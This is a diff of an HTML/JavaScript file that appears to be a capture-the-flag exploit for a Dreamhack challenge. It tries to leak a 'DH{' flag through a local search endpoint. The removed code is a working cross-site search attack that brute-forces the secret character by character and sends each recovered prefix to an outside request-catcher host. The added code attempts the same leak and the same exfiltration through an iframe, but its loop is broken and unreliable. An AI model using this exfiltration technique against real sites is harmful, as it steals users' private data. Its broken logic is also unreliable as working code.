@@ -1,43 +1,18 @@
 <iframe id="iframe"></iframe>
-<img id="img">
 <script>
-    async function req(url) {
-        return await new Promise((resolve, reject) => {
-            const iframe = document.getElementById("iframe");
-            iframe.src = url;
-            iframe.onload = () => { 
-                var divElement = iframe.contentDocument.querySelector('.sentence-list');
-                var ulElement = divElement.querySelector('ul');
-                var liElement = ulElement.querySelector('li');
-                if (liElement != 0)
-                    return resolve();
-                else
-                    return reject();
-            };
-        });
-    }
-    async function search(query) {
-        try {
-            await req(
-              `http://127.0.0.1:8000/search?keyword=${query}`
-            );
-            return true;
-        } catch (e) {
-            return false;
+    let str = "0123456789abcdef";
+    let a = document.createElement('script');
+    let secret = 'DH{';
+    for (let j = 0; j < 32; j++){
+        for(let i of str){
+            let qu = secret + i;
+            a.src=`<img src='http://127.0.0.1:8000/search?keyword=${qu}'>`;
+            a.onload=()=>{
+                secret = secret + i;
+                console.log('200');};
+            a.onerror=()=>{console.log('404');};
         }
     }
-    async function exploit() {
-        let chars = "0123456789abcdef"
-        let secret = "DH{";
-        while (!secret.includes("}")) {
-            for (let c of chars) {
-                if (await search(secret + c)) {
-                    secret += c;
-                    img.src = `https://kfaxtem.request.dreamhack.games/${secret}`;
-                    break;
-                }
-            }
-        }
-    }
-    exploit();
+    iframe.src = `https://qwymbik.request.dreamhack.games/${secret}`;
+    
 </script>
